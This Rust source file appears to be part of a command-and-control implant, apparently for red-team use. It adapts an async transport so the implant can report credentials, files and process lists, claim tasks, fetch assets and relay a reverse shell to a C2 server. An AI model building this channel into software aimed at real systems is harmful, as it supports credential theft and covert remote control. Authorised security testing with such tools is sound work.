use anyhow::Result;
use pb::c2::*;
use std::future::Future;
use std::pin::Pin;
use std::sync::mpsc::{Receiver, Sender};
use std::sync::Arc;

use crate::Transport;

pub type TransportFactory<T> =
    Box<dyn Fn() -> Pin<Box<dyn Future<Output = Result<T>> + Send>> + Send + Sync>;

pub trait SyncTransport: Send + Sync {
    fn fetch_asset(&self, req: FetchAssetRequest) -> Result<Vec<u8>>;
    fn report_credential(&self, req: ReportCredentialRequest) -> Result<ReportCredentialResponse>;
    fn report_file(&self, req: ReportFileRequest) -> Result<ReportFileResponse>;
    fn report_process_list(
        &self,
        req: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse>;
    fn report_task_output(&self, req: ReportTaskOutputRequest) -> Result<ReportTaskOutputResponse>;
    fn reverse_shell(
        &self,
        rx: Receiver<ReverseShellRequest>,
        tx: Sender<ReverseShellResponse>,
    ) -> Result<()>;
    fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<ClaimTasksResponse>;
}

pub struct SyncTransportAdapter<T: Transport> {
    pub transport: Arc<tokio::sync::RwLock<T>>,
    pub runtime: tokio::runtime::Handle,
    pub factory: Option<TransportFactory<T>>,
}

impl<T: Transport> SyncTransportAdapter<T> {
    pub fn new(transport: Arc<tokio::sync::RwLock<T>>, runtime: tokio::runtime::Handle) -> Self {
        Self {
            transport,
            runtime,
            factory: None,
        }
    }

    pub fn new_with_factory(
        transport: Arc<tokio::sync::RwLock<T>>,
        runtime: tokio::runtime::Handle,
        factory: Option<TransportFactory<T>>,
    ) -> Self {
        Self {
            transport,
            runtime,
            factory,
        }
    }

    fn block_on<F, R>(&self, future: F) -> Result<R>
    where
        F: std::future::Future<Output = Result<R>>,
    {
        self.runtime.block_on(future)
    }
}

impl<T: Transport + Clone + Sync + 'static> SyncTransportAdapter<T> {
    async fn get_transport(&self) -> T {
        let t_guard = self.transport.read().await;
        let t = t_guard.clone();
        drop(t_guard);

        if t.is_active() {
            return t;
        }

        if let Some(factory) = &self.factory {
            match factory().await {
                Ok(new_t) => return new_t,
                Err(_e) => {
                    #[cfg(debug_assertions)]
                    eprintln!("Transport factory failed: {}", _e);
                }
            }
        }
        t
    }
}

impl<T: Transport + Clone + Sync + 'static> SyncTransport for SyncTransportAdapter<T> {
    fn fetch_asset(&self, req: FetchAssetRequest) -> Result<Vec<u8>> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await?;
            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(&self, req: ReportCredentialRequest) -> Result<ReportCredentialResponse> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            t.report_credential(req).await
        })
    }

    fn report_file(&self, req: ReportFileRequest) -> Result<ReportFileResponse> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req)?;
            drop(tx);
            t.report_file(rx).await
        })
    }

    fn report_process_list(
        &self,
        req: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            t.report_process_list(req).await
        })
    }

    fn report_task_output(&self, req: ReportTaskOutputRequest) -> Result<ReportTaskOutputResponse> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            t.report_task_output(req).await
        })
    }

    fn reverse_shell(
        &self,
        rx: Receiver<ReverseShellRequest>,
        tx: Sender<ReverseShellResponse>,
    ) -> Result<()> {
        self.block_on(async move {
            let mut t = self.get_transport().await;
            let (tokio_tx_req, tokio_rx_req) = tokio::sync::mpsc::channel(32);
            let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);
            let rx_bridge = tokio::task::spawn_blocking(move || {
                while let Ok(msg) = rx.recv() {
                    if tokio_tx_req.blocking_send(msg).is_err() {
                        break;
                    }
                }
            });
            let tx_bridge = tokio::spawn(async move {
                while let Some(msg) = tokio_rx_resp.recv().await {
                    if tx.send(msg).is_err() {
                        break;
                    }
                }
            });
            if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
                #[cfg(debug_assertions)]
                eprintln!("Transport reverse_shell error: {}", _e);
            }
            rx_bridge.abort();
            tx_bridge.abort();
            Ok(())
        })
    }

    fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.block_on(async {
            let mut t = self.get_transport().await;
            t.claim_tasks(req).await
        })
    }
}
